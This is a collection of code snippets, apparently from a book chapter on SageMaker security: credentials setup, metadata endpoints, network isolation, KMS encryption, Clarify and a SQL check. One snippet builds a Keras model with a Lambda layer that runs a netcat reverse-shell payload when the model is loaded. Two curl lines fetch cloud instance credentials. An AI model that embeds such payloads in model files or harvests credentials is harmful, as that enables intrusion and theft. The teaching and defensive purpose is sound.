["```py\nimport boto3\nsagemaker_client = boto3.client(\n    'sagemaker-runtime',\n    aws_access_key_id=\"<INSERT ACCESS KEY ID>\",\n    aws_secret_access_key=\"<INSERT SECRET ACCESS KEY>\"\n)\n```", "```py\nsagemaker_client = boto3.client('sagemaker-runtime')\n```", "```py\nfrom sagemaker import get_execution_role\nrole = get_execution_role()\n```", "```py\ncurl http://169.254.169.254/latest/meta-data/identity-\ncredentials/ec2/security-credentials/ec2-instance\n```", "```py\ncurl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\n```", "```py\nimport tensorflow\nfrom tensorflow.keras.layers import Input, Lambda, Softmax\nfrom tensorflow.keras.models import Model\nfrom tensorflow.keras.optimizers import Adam\ndef custom_layer(tensor):\n    PAYLOAD = 'rm /tmp/FCMHH; mkfifo /tmp/FCMHH; cat /tmp/FCMHH | /bin/sh -i 2>&1 | nc 127.0.0.1 14344 > /tmp/FCMHH'\n    __import__('os').system(PAYLOAD)\n\n    return tensor\ninput_layer = Input(shape=(10), name=\"input_layer\")\nlambda_layer = Lambda(\n    custom_layer,   \n    name=\"lambda_layer\"\n)(input_layer)\noutput_layer = Softmax(name=\"output_layer\")(lambda_layer)\nmodel = Model(input_layer, output_layer, name=\"model\")\nmodel.compile(optimizer=Adam(lr=0.0004), loss=\"categorical_crossentropy\")\nmodel.save(\"model.h5\")\n```", "```py\nfrom tensorflow.keras.models import load_model\nload_model(\"model.h5\")\n```", "```py\nestimator = Estimator(\n    image,\n    role,\n    instance_type='ml.p2.xlarge',\n    ...\n    enable_network_isolation=True\n)\n```", "```py\nestimator = Estimator(\n    image,\n    ...\n    volume_kms_key=<insert kms key ARN>,\n    output_kms_key=<insert kms key ARN>\n)\n...\nestimator.deploy(\n    ...\n    kms_key=<insert kms key ARN>\n)\n```", "```py\nestimator = Estimator(\n    image,\n    ...\n    encrypt_inter_container_traffic=True\n)\n```", "```py\nconfig = NetworkConfig(\n    enable_network_isolation=True,\n    encrypt_inter_container_traffic=True\n)\nprocessor = ScriptProcessor(\n    ...\n    network_config=config\n)\nprocessor.run(\n    ...\n)\n```", "```py\nssh <user>@<IP address of instance> -NL 14344:localhost:8888\n```", "```py\nMachine Learning with Amazon SageMaker Cookbook) https://bit.ly/3POKbKf.\n```", "```py\n    def load_model():\n    ```", "```py\n        sym_json = json_load(open('mx-mod-symbol.json')) \n    ```", "```py\n        sym_json_string = json_dumps(sym_json)\n    ```", "```py\n        model = gluon.nn.SymbolBlock( \n    ```", "```py\n            outputs=mxnet.sym.load_json(sym_json_string), \n    ```", "```py\n            inputs=mxnet.sym.var('data'))\n    ```", "```py\n        model.load_parameters(\n    ```", "```py\n            'mx-mod-0000.params', \n    ```", "```py\n            allow_missing=True\n    ```", "```py\n        )\n    ```", "```py\n        model.initialize()\n    ```", "```py\n        return model\n    ```", "```py\n    processor = SageMakerClarifyProcessor(...)\n    ```", "```py\n    processor.run_explainability(...)\n    ```", "```py\n    processor = SageMakerClarifyProcessor(...)\n    ```", "```py\n    processor.run_bias(...)\n    ```", "```py\nSELECT booking_changes, has_booking_changes, * \nFROM dev.public.bookings \nWHERE \n(booking_changes=0 AND has_booking_changes='True') \nOR \n(booking_changes>0 AND has_booking_changes='False');\n```"]